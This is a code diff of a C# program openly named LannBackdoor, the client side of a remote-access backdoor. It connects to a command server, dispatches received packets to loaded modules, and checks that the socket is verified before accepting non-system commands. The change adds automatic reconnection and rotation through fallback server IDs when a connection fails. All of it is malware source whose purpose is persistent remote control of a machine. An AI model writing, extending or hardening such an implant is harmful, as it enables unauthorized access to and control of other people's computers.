@@ -1,9 +1,11 @@
 ﻿using System.Net.Sockets;
 using System.Reflection;
 using LannLogger;
+using LannUtils;
 using ModulesApi;
 using Networking;
 using Networking.Packets;
+using Newtonsoft.Json.Linq;
 using Serilog.Core;
 using SystemModule;
 using Constants = LannConstants.Constants;
@@ -13,6 +15,7 @@ namespace LannBackdoor;
 public static class LannBackdoor {
     private static readonly Logger Logger = LoggerFactory.CreateLogger("LannBackdoor");
     private static TCPClient _tcpClient = null!;
+    private static int serverId;
 
     public static async Task Main(string[] args) {
         Console.OutputEncoding = System.Text.Encoding.UTF8;
@@ -23,18 +26,25 @@ public static class LannBackdoor {
             true,
             "127.0.0.1",
             2022);
-        
+
         ModuleRegistry.LoadByAssembly(typeof(SystemModuleImpl).Assembly);
-        _tcpClient = new TCPClient();
+        await Connect();
+
+        while (true) { await Task.Delay(1000); }
+    }
+
+    private static async Task Connect() {
+        _tcpClient = new TCPClient(Utils.CreateURL(serverId), Constants.PORT);
 
         _tcpClient.OnConnect += async (_, _) => {
             Logger.Information("Connected!");
+            await _tcpClient.StartHandlingPackets();
             await _tcpClient.SendPacket(PacketType.Ready, new { });
         };
 
         _tcpClient.OnCommand += async (_, data) => {
             Packet packet = data.Packet;
-            Logger.Debug("Packet received: {Module}/{Handler}: {Data}",
+            Logger.Debug("Packet received: {Module}/{Handler}: {@Data}",
                 packet.ModuleId,
                 packet.HandlerId,
                 packet.GetData<object>());
@@ -42,6 +52,12 @@ public static class LannBackdoor {
             ModuleInfo? module = ModuleRegistry.Get(packet.ModuleId);
             if (module == null) {
                 Logger.Debug("Unknown module: {Id}", packet.ModuleId);
+                return;
+            }
+
+            if (!_tcpClient.IsVerified && !module.Name.Equals("system")) {
+                Logger.Fatal("Socket is not verified, but packet received!");
+                _tcpClient.Dispose();
                 return;
             }
 
@@ -64,15 +80,16 @@ public static class LannBackdoor {
             }
         };
 
-        await Connect();
-    }
-    
-    private static async Task Connect() {
+        _tcpClient.OnClose += async (_, _) => {
+            Logger.Information("Socket closed, reconnecting in 5000 ms");
+            await Task.Delay(5000);
+            await Connect();
+        };
+
         try {
             await _tcpClient.Connect();
-            await _tcpClient.StartHandlingPackets();
-        } catch (SocketException) {
-            Logger.Error("Failed to connect! Reconnecting in 5000 ms");
+        } catch {
+            Logger.Information("Connection failed, connecting to server {Id} in 5000 ms", ++serverId);
             await Task.Delay(5000);
             await Connect();
         }
